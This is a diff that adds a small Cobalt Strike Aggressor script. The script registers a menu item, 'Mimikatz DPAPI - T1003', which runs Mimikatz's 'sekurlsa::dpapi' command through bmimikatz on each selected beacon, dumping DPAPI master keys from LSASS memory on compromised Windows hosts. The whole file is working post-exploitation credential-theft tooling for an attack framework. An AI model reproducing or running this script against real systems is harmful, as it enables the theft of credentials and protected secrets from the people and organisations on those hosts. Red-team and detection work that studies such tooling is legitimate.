@@ -1,0 +1,13 @@
+item "Mimikatz DPAPI  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					dpapi($bid);
+				}
+			}
+			
+			
+sub dpapi{
+
+bmimikatz($1, "sekurlsa::dpapi");
+
+}			
